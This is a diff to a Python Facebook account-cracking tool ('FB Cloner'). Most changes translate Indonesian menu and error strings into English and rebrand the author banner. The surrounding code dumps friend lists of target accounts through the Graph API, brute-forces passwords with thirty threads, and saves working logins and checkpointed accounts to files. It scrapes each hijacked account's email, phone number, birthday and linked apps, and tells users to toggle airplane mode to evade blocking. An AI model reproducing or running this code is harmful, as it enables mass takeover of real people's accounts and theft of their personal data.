@@ -55,12 +55,12 @@ def back():
 # BANNER
 def banner():
 	clear()
-	wel = '# WELCOME TO FACEBOOK  TOOLS 2022'
+	wel = '# WELCOME TO RYDAH FB CLONER 2022'
 	wel2 = mark(wel, style='cyan')
 	sol().print(wel2)
-	au='AUTHOR    :  Alzwage\nGITHUB    :  https://github.com/AhmedAlzwage\nWHATSAPP  :  00218921762445'
+	au='AUTHOR    :  RYDAH TM\nGITHUB    :  https://github.com/HIDDEN\nWHATSAPP  :  +2349017624430'
 	pengembang1=nel(au,style="cyan")
-	cetak(nel(pengembang1, title='INFORMASI PENGEMBANG'))
+	cetak(nel(pengembang1, title='DEVELOPER INFORMATION'))
 
 # VALIDASI TOKEN
 def login():
@@ -87,7 +87,7 @@ def login():
 # LOGIN
 def login_lagi():
 	banner()
-	sky = '# LOGIN MENGGUNAKAN AKSES TOKEN'
+	sky = '# LOGIN WITH FB ACCESS TOKEN'
 	sky2 = mark(sky, style='green')
 	sol().print(sky2, style='cyan')
 	panda = input(x+'['+p+'f'+x+'] Token : ')
@@ -95,19 +95,19 @@ def login_lagi():
 	try:
 		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
 		tes3 = json.loads(tes.text)['id']
-		sue = '# Login Sukses, Tunggu Sebentar!'
+		sue = '# TOKEN LOGGED SUCCESSFUL, WAIT A MOMENT!'
 		suu = mark(sue, style='green')
 		sol().print(suu, style='cyan')
 		time.sleep(2.5)
 		login()
 	except KeyError:
-		sue = '# Login Gagal, Periksa Token Anda!'
+		sue = '# TOKEN FAILED, CHECK YOUR TOKEN!'
 		suu = mark(sue, style='red')
 		sol().print(suu, style='cyan')
 		time.sleep(2.5)
 		login_lagi()
 	except requests.exceptions.ConnectionError:
-		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+		li = '# INTERNET CONNECTION ERROR, CHECK CONNECTION'
 		lo = mark(li, style='red')
 		sol().print(lo, style='cyan')
 		exit()
@@ -130,7 +130,7 @@ def menu(my_name,my_id,my_birthday):
 	print(x+'['+h+'•'+x+'] User Id     : '+str(my_id))
 	print(x+'['+h+'•'+x+'] User Ttl    : '+str(birth))
 	print(x+'['+h+'•'+x+'] Ip Address  : '+str(sh['origin']))
-	io = '[01] Crack Dari Pertemanan Publik\n[02] Crack Dari Pertemanan Publik (Massal)\n[03] Cek Result Crack\n[04] Cek Opsi Checkpoint\n[00] Log Out'
+	io = '[01] CracK From Public ID\n[02] Crack From Public ID (Bulk)\n[03] Check Crack Results\n[04] Check Checkpoint Option\n[00] Log Out'
 	oi = nel(io, style='cyan')
 	cetak(nel(oi, title='MENU'))
 	jh = input(x+'['+p+'<>'+x+'] Pilih : ')
@@ -156,26 +156,26 @@ def menu(my_name,my_id,my_birthday):
 
 # RESULT CHECKER
 def result():
-	cek = '# CEK RESULT CRACK'
+	cek = '# CHECK CRACK RESULT'
 	sol().print(mark(cek, style='green'))
-	kayes = '[01] Cek Hasil Cp\n[02] Cek Hasil Ok\n[00] Kembali Ke Menu'
+	kayes = '[01] Check Cp Result\n[02] Check Ok Result\n[00] Return To Menu'
 	kis = nel(kayes, style='cyan')
 	cetak(nel(kis, title='RESULTS'))
 	kz = input(x+'['+p+'f'+x+'] Pilih : ')
 	if kz in ['1','01']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			gada = '# DIREKTORI TIDAK DITEMUKAN'
+			gada = '# DIRECTORY NOT FOUND'
 			sol().print(mark(gada, style='red'))
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			haha = '# ANDA BELUM MEMILIKI RESULT CP'
+			haha = '# YOU DONT HAVE ANY CP RESULT'
 			sol().print(mark(haha, style='yellow'))
 			time.sleep(2)
 			back()
 		else:
-			gerr = '# HASIL CP ANDA'
+			gerr = '# YOUR CP RESULT'
 			sol().print(mark(gerr, style='green'))
 			cih = 0
 			lol = {}
@@ -196,36 +196,36 @@ def result():
 			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				ric = '# PILIHAN TIDAK ADA DI MENU'
+				ric = '# OPTION NOT ON MENU'
 				sol().print(mark(ric, style='red'))
 				exit()
 			try:lin = open('CP/'+geh,'r').read()
 			except:
-				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
+				hehe = '# FILE NOT FOUND, CHECK & TRY AGAIN'
 				sol().print(mark(hehe, style='red'))
 				time.sleep(2)
 				back()
-			akun = '# LIST AKUN CP ANDA'
+			akun = '# LIST YOUR CP ACCOUNT'
 			sol().print(mark(akun, style='green'))
 			hus = os.system('cd CP && cat '+geh)
-			akun2 = '# LIST AKUN CP ANDA'
+			akun2 = '# LIST YOUR CP ACCOUNT'
 			sol().print(mark(akun, style='green'))
 			input(x+'['+h+'•'+x+'] Kembali')
 			back()
 	elif kz in ['2','02']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			gada = '# DIREKTORI TIDAK DITEMUKAN'
+			gada = '# DIRECTORY NOT FOUND'
 			sol().print(mark(gada, style='red'))
 			time.sleep(2)
 			back()
 		if len(vin)==0:
-			haha = '# ANDA BELUM MEMILIKI RESULT OK'
+			haha = '# YOU DONT HAVE ANY OK RESULT'
 			sol().print(mark(haha, style='yellow'))
 			time.sleep(2)
 			back()
 		else:
-			gerr = '# HASIL OK ANDA'
+			gerr = '# YOUR OK RESULTS'
 			sol().print(mark(gerr, style='green'))
 			cih = 0
 			lol = {}
@@ -241,21 +241,21 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
-			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
+			gerr2 = '# SELECT RESULT TO DISPLAY'
 			sol().print(mark(gerr2, style='green'))
 			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				ric = '# PILIHAN TIDAK ADA DI MENU'
+				ric = '# THE OPTION CHOOSED NOT ON MENU'
 				sol().print(mark(ric, style='red'))
 				exit()
 			try:lin = open('OK/'+geh,'r').read()
 			except:
-				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
+				hehe = '# FILE NOT FOUND CHECK & TRY AGAIN LATER'
 				sol().print(mark(hehe, style='red'))
 				time.sleep(2)
 				back()
-			akun = '# LIST AKUN OK ANDA'
+			akun = '# REGISTER YOUR OK ACCOUNT'
 			sol().print(mark(akun, style='green'))
 			hus = os.system('cd OK && cat '+geh)
 			akun2 = '# LIST AKUN OK ANDA'
@@ -265,17 +265,17 @@ def result():
 	elif kz in ['0','00']:
 		back()
 	else:
-		ric = '# PILIHAN TIDAK ADA DI MENU'
+		ric = '# THE OPTION IS NOT IN THE MENU'
 		sol().print(mark(ric, style='red'))
 		exit()
 
 # OPEN
 def file():
-	tek = '# CEK OPSI DARI FILE'
+	tek = '# CHECK OPTION FROM FILE'
 	sol().print(mark(tek, style='cyan'), style='on red')
 	print(x+'['+h+'•'+x+'] Sedang Membaca File, Tunggu Sebentar ...')
 	time.sleep(2)
-	teks = '# PILIH FILE YG AKAN DI CEK'
+	teks = '# SELECT THE FILE TO BE CHECKED'
 	sol().print(mark(teks, style='green'))
 	my_files = []
 	try:
@@ -289,7 +289,7 @@ def file():
 			my_files.append(ty)
 	except:pass
 	if len(my_files)==0:
-		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
+		yy = '# YOU DONT HAVE ANY RESULTS TO CHECK YET'
 		sol().print(mark(yy, style='red'))
 		exit()
 	else:
@@ -309,12 +309,12 @@ def file():
 			else:
 				lol.update({str(cih):str(isi)})
 				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
-		teks2 = '# PILIH FILE YG AKAN DI CEK'
+		teks2 = '# SELECT THE FILE TO BE CHECKED'
 		sol().print(mark(teks2, style='green'))
 		geeh = input(x+'['+p+'f'+x+'] Pilih : ')
 		try:geh = lol[geeh]
 		except KeyError:
-			ric = '# PILIHAN TIDAK ADA DI MENU'
+			ric = '# OPTION NOT IN MENU'
 			sol().print(mark(ric, style='red'))
 			exit()
 		try:
@@ -329,22 +329,22 @@ def file():
 					akun.append(fz.replace('\n',''))
 				cek_opsi()
 			except IOError:
-				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
+				hehe = '# FILE NOT FOUND CHECK & TRY AGAIN'
 				sol().print(mark(hehe, style='red'))
 				time.sleep(2)
 				back()
 
-# DUMP ID PUBLIK
+# PUBLIC ID DUMP
 def dump_publik():
 	try:
 		token = open('.token.txt','r').read()
 	except IOError:
 		exit()
-	win = '# DUMP ID PUBLIK'
+	win = '# PUBLIC ID DUMP'
 	win2 = mark(win, style='green')
 	sol().print(win2)
-	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
-	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
+	print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP ID FROM MENU')
+	pil = input(x+'['+p+'f'+x+'] Enter ID Target : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
@@ -353,26 +353,26 @@ def dump_publik():
 		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+		li = '# INTERNET CONNECTION PROBLEM CHECK & TRY AGAIN'
 		lo = mark(li, style='red')
 		sol().print(lo, style='cyan')
 		exit()
 	except (KeyError,IOError):
-		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
+		teks = '# ID NOT PUBLIC OR TOKEN BROKEN'
 		teks2 = mark(teks, style='red')
 		sol().print(teks2)
 		exit()
 
-# DUMP ID MASSAL
+# DUMP BULK ID
 def dump_massal():
-	win = '# DUMP ID PUBLIK MASSAL'
+	win = '# DUMP BULK ID'
 	win2 = mark(win, style='green')
 	sol().print(win2)
-	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
+	print(x+'['+h+'•'+x+'] ENTER NUMBER OF ID (LIMIT 10)')
 	try:
-		jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
+		jum = int(input(x+'['+p+'f'+x+'] HOW MANY ID : '))
 	except ValueError:
-		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
+		pesan = '# THE INPUT YOU ENTERED IS NOT VALID'
 		pesan2 = mark(pesan, style='red')
 		sol().print(pesan2)
 		exit()
@@ -383,10 +383,10 @@ def dump_massal():
 		exit()
 	ses=requests.Session()
 	yz = 0
-	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
+	print(x+'['+h+'•'+x+'] TYPE "me" IF YOU DUMP ID FROM MENU')
 	for met in range(jum):
 		yz+=1
-		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
+		kl = input(x+'['+h+str(yz)+x+'] Enter ID To '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -400,11 +400,11 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+			li = '# INTERNET CONNECTION PROBLEM, CHECK & TRY AGAIN'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
-	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
+	tot = '# SUCCESSFULLY COLLECT %s ID'%(len(id))
 	if len(id)==0:
 		tot2 = mark(tot, style='red')
 	else:
@@ -412,14 +412,14 @@ def dump_massal():
 	sol().print(tot2)
 	setting()
 
-# PENGATURAN ID
+# SETTING ID
 def setting():
-	wl = '# SETTING URUTAN ID'
+	wl = '# ID ORDER SETTINS'
 	sol().print(mark(wl, style='green'))
-	teks = '[01] Crack Dari Akun Tertua (Not Recommended)\n[02] Crack Dari Akun Termuda (Recommended)\n[03] Acak Urutan ID (Highly Recommended)'
+	teks = '[01] Crack Old Ids (Not Recommended)\n[02] Crack New Ids (Recommended)\n[03] Crack Mix Ids (Highly Recommended)'
 	tak = nel(teks, style='cyan')
 	cetak(nel(tak, title='SETTING'))
-	hu = input(x+'['+p+'f'+x+'] Pilih : ')
+	hu = input(x+'['+p+'f'+x+'] Select : ')
 	if hu in ['1','01']:
 		for bacot in id:
 			id2.append(bacot)
@@ -431,29 +431,29 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		ric = '# PILIHAN TIDAK ADA DI MENU'
+		ric = '# Invalid Option'
 		sol().print(mark(ric, style='red'))
 		exit()
-	met = '# PILIH METHOD CRACK'
+	met = '# Choose Clone Method'
 	sol().print(mark(met, style='green'))
-	ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)\n[03] Methode Free Facebook'
+	ioz = '[01] Method B-Api (Fast)\n[02] Method Mobile (Slow)\n[03] Method MBasic'
 	gess = nel(ioz, style='cyan')
 	cetak(nel(gess, title='METHOD'))
-	hc = input(x+'['+p+'f'+x+'] Pilih : ')
+	hc = input(x+'['+p+'f'+x+'] Select : ')
 	if hc in ['1','01']:
 		method.append('api')
 	elif hc in ['3','03']:
 		method.append('free')
 	else:
 		method.append('mobile')
-	guw = '# PILIHAN OPSI CRACK '
+	guw = '# CLONE OPTION '
 	sol().print(mark(guw, style='green'))
-	aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Tertaut ? (y/t) : ')
+	aplik = input(x+'['+p+'f'+x+'] Show Linked Apps ? (y/t) : ')
 	if aplik in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
+	osk = input(x+'['+p+'f'+x+'] Show CheckPoint Option? [ Not Recommended ] (y/t) : ')
 	if osk in ['y','Y']:
 		oprek.append('ya')
 	else:
@@ -462,9 +462,9 @@ def setting():
 
 # WORDLIST
 def passwrd():
-	ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
+	ler = '# Clone Process Starts, Press CTRL+Z To Stop'
 	sol().print(mark(ler, style='green'))
-	krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
+	krek = 'Ok Results Saved to : OK/%s\nCheckPoint Result Saved To : CP/%s\nHidupkan/Turn Airplane Mode On/Off Every 5 Minutes'%(okc,cpc)
 	cetak(nel(krek, title='CRACK'))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -495,9 +495,9 @@ def passwrd():
 			else:
 				pool.submit(crack,idf,pwv)
 	print('')
-	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
+	tanya = '# Want To Check The Crack Result Option?'
 	sol().print(mark(tanya, style='green'))
-	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
+	woi = input(x+'['+p+'f'+x+'] Want To Check The Crack Result Option? (y/t) : ')
 	if woi in ['y','Y']:
 		cek_opsi()
 	else:
@@ -577,7 +577,7 @@ def crack(idf,pwv):
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")
+					infoakun += (f"[✓] Account Name       : {name}\n[✓] Number Of Friends    : {friend}\n[✓] Number Of Followers : {follower}\n[✓] Active Email     : {email}\n[✓] Active Number     : {number}\n[✓] Account Year      : {year}\n[✓] Date Of Birth   : {ttl}\n")
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
@@ -595,7 +595,7 @@ def crack(idf,pwv):
 								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
 								hit2+=1
 						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
-							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
+							infoakun += (f"\nNo Expired Apss Associated\n")
 						else:
 							hit1,hit2=0,0
 							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
@@ -746,7 +746,7 @@ def crack3(idf,pwv):
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")
+					infoakun += (f"[✓] Account Name       : {name}\n[✓] Number Of Friends    : {friend}\n[✓] Number Of Follower : {follower}\n[✓] Active Email     : {email}\n[✓] Active Number     : {number}\n[✓] Year Of Account     : {year}\n[✓] Date Of Birth   : {ttl}\n")
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
@@ -814,7 +814,7 @@ def ceker(idf,pw):
 				print('\r%s---> %s%s'%(kk,opsii.text,x))
 	except Exception as c:
 		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
-		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
+		print('\r%s---> Unable To Check Option (Login With FB Lite/Mbasic)%s'%(u,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 
@@ -834,7 +834,7 @@ def cek_opsi():
 			except IndexError:
 				time.sleep(2)
 				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
-				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
+				print('\r%s---> SEPERATOR NOT SUPPORTED FOR THIS PROGRAM%s'%(u,x))
 				continue
 			bi = random.choice([u,k,kk,b,h,hh])
 			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
@@ -855,13 +855,13 @@ def cek_opsi():
 					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
 					opsi = kent.find_all('option')
 					if len(opsi)==0:
-						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+						print('\r%s---> Tap Yes / A2F (Log With FB Lite/Mbasic%s)'%(hh,x))
 					else:
 						for opsii in opsi:
 							print('\r%s---> %s%s'%(kk,opsii.text,x))
 				except:
 					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
-					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
+					print('\r%s---> CANT CHECK OPTION%s'%(u,x))
 			elif "c_user" in ses.cookies.get_dict().keys():
 				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
 			else:
@@ -869,7 +869,7 @@ def cek_opsi():
 			love+=1
 		except requests.exceptions.ConnectionError:
 			print('')
-			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+			li = '# INTERNET CONNECTION PROBLEM, CHECK & TRY AGAIN'
 			sol().print(mark(li, style='red'))
 			exit()
 	dah = '# DONE'
